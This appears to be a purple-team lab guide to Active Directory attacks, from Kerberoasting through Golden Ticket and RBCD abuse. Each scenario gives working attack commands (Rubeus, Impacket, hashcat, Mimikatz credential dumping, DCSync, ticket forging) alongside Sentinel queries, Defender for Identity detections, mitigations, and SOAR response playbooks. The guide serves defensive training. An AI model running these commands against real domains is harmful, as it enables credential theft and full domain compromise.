# 🧩 **ATTACK SCENARIO 1 — Kerberoasting**

### 🔥 **Goal:** Extract TGS tickets → crack service account passwords

***

## 🛠 Step 1 — Identify SPN Accounts

On the attacker VM:

```powershell
setspn -Q */*
```

Or PowerView:

```powershell
Get-NetUser -SPN
```

***

## 🛠 Step 2 — Request TGS Tickets

Using Rubeus:

```powershell
Rubeus.exe kerberoast
```

Or Impacket:

```bash
GetUserSPNs.py domain/user:password -request
```

***

## 🔥 STEP 3 — Offline Crack

```bash
hashcat -m 13100 roast_hashes.txt rockyou.txt
```

***

## 🛡 Defense & Detection

### ✔ Defender for Identity

Should trigger alerts like:  
**“Suspected Kerberoasting attack”**

### ✔ Sentinel

Query:

```kusto
SecurityEvent
| where EventID == 4769
| summarize count() by TargetUserName, IpAddress
```

### ✔ Mitigations

*   Convert service accounts → gMSA
*   Enforce **AES encryption only**
*   Enforce **long, random passwords**
*   Remove stale SPNs

***

# 🧩 **ATTACK SCENARIO 2 — AS‑REP Roasting**

### 🔥 **Goal:** Dump AS‑REP hashes for accounts without preauth

***

## 🛠 Step 1 — Scan for vulnerable users

```powershell
Get-DomainUser -PreauthNotRequired
```

***

## 🛠 Step 2 — Request AS‑REP Hashes

```bash
GetNPUsers.py contoso.local/ -usersfile users.txt
```

***

## 🔥 Step 3 — Crack Hash

```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

***

## 🛡 Defense & Detection

### ✔ Ensure “Do not require Kerberos pre-authentication” is **disabled**

### ✔ Defender for Identity detects AS‑REP anomalies

### ✔ Identify weak passwords → enforce conditional access + MFA

***

# 🧩 **ATTACK SCENARIO 3 — Pass‑the‑Hash (PtH)**

### 🔥 **Goal:** Use NTLM hash to authenticate without password

***

## 🛠 Step 1 — Dump Hashes (Simulated)

Using Mimikatz:

```powershell
sekurlsa::logonpasswords
```

***

## 🛠 Step 2 — Authenticate via Hash

```bash
evil-winrm -i server -u Administrator -H <NTLM_HASH>
```

***

## 🛡 Defense & Detection

### ✔ Defender for Identity detects PtH

### ✔ Sentinel detects unusual “Logon Type 3”

### ✔ Enforce **LAPS**

### ✔ Block legacy NTLM via GPO

### ✔ Enforce device compliance

***

# 🧩 **ATTACK SCENARIO 4 — Pass‑the‑Ticket (PtT)**

### 🔥 **Goal:** Reuse Kerberos tickets to access resources

***

## 🛠 Step 1 — Dump Tickets

```powershell
sekurlsa::tickets
```

## 🛠 Step 2 — Inject Ticket

```powershell
kerberos::ptt <ticket.kirbi>
```

***

## 🛡 Defense & Detection

*   MDI detects **PTT / ticket anomalies**
*   Enforce short ticket lifetimes
*   Use **AES-only** tickets
*   Enforce Windows Hello / FIDO → reduce ticket theft

***

# 🧩 **ATTACK SCENARIO 5 — DCSync Attack**

### 🔥 **Goal:** Extract password hashes from domain controller without DC login

***

## 🛠 Step 1 — Abuse Replication Rights

```powershell
mimikatz.exe
lsadump::dcsync /user:krbtgt
```

***

## 🛡 Defense & Detection

### ✔ MDI detects: “Suspected DCSync attack”

### ✔ Sentinel Query:

```kusto
SecurityEvent
| where EventID == 4662 and ObjectName contains "DS-Replication"
```

### ✔ Mitigations:

*   Remove replication rights from non-DC accounts
*   Monitor AdminSDHolder / ACLs
*   Tier‑0 protection
*   PIM for privileged roles

***

# 🧩 **ATTACK SCENARIO 6 — Golden Ticket Attack**

### 🔥 **Goal:** Forge TGT using KRBTGT hash → unlimited domain access

***

## 🛠 Step 1 — Obtain KRBTGT Hash

(Done via DCSync)

***

## 🛠 Step 2 — Forge Ticket

```powershell
kerberos::golden /user:fakeuser /domain:contoso.local /sid:<domainSID> /krbtgt:<hash>
```

***

## 🛠 Step 3 — Inject Ticket

```powershell
kerberos::ptt golden.kirbi
```

***

## 🛡 Defense & Mitigation

*   MDI detects Golden Ticket anomalies
*   Sentinel correlates unusual TGT patterns
*   Reset KRBTGT twice
*   Use PIM + Tiering
*   Disable legacy protocols

***

# 🧩 **ATTACK SCENARIO 7 — RBCD (Resource-Based Constrained Delegation)**

### 🔥 **Goal:** Impersonate users through misconfigured delegation\*\*

***

## 🛠 Step 1 — Abuse RBCD Misconfig

Attackers modify:

    msDS-AllowedToActOnBehalfOfOtherIdentity

***

## 🛠 Step 2 — Execute S4U2Self / S4U2Proxy

```bash
getST.py -spn cifs/server user -impersonate Administrator
```

***

## 🛡 Mitigation

*   Audit RBCD settings
*   Use gMSA
*   Restrict Service Principal Delegation
*   MDI detects suspicious delegation flows

***

# 🧩 **ATTACK SCENARIO 8 — Lateral Movement (SMB, WMI, RDP)**

# 🛠 **DEFENSE: Sentinel Automation (SOAR Blueprints)**

Below are ready‑to‑deploy SOAR workflows.

***

## ⭐ **SOAR PLAYBOOK 1 — Auto‑Disable Compromised User**

**Trigger:**

*   MDI alert: PtH, PtT, DCSync
*   Entra ID “High‑Risk User”

**Logic App Steps:**

1.  `PATCH /users/{id}` → `accountEnabled=false`
2.  Revoke refresh tokens
3.  Reset password
4.  Require MFA re‑registration
5.  Notify SOC (Teams + email)
6.  Create ticket

***

## ⭐ **SOAR PLAYBOOK 2 — Auto-Isolate Compromised Machine**

**Trigger:** Defender for Endpoint alert

**Actions:**

*   Isolate device
*   Collect AV scan logs
*   Dump running processes
*   Notify SOC

***

## ⭐ **SOAR PLAYBOOK 3 — Rapid DCSync Response**

**Trigger:** MDI DCSync alert

**Actions:**

*   Disable suspicious account
*   Alert Tier‑3
*   Collect DC logs via Azure Automation
*   Provide KRBTGT rotation instructions
